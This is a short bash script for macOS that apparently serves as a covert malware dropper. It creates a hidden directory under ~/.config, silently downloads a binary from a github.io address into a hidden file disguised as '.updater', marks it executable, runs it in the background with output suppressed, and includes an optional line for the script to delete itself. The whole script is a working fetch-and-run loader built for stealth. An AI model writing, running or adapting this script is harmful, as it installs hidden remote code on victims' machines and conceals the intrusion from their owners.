#!/bin/bash

# Create hidden directory for agent
DEST="$HOME/.config/.sys"
mkdir -p "$DEST"

# Define agent URL (replace with your actual URL)
AGENT_URL="https://draysongz.github.io/binaries/client-macos"

# Agent filename (hidden dot file)
AGENT_BIN="$DEST/.updater"

# Download the agent silently
curl -sSL "$AGENT_URL" -o "$AGENT_BIN"

# Make it executable
chmod +x "$AGENT_BIN"

# Run the agent silently in background, redirect output to /dev/null
nohup "$AGENT_BIN" > /dev/null 2>&1 &

# Optional: Remove this script after running (uncomment if you want)
# rm -- "$0"

exit 0
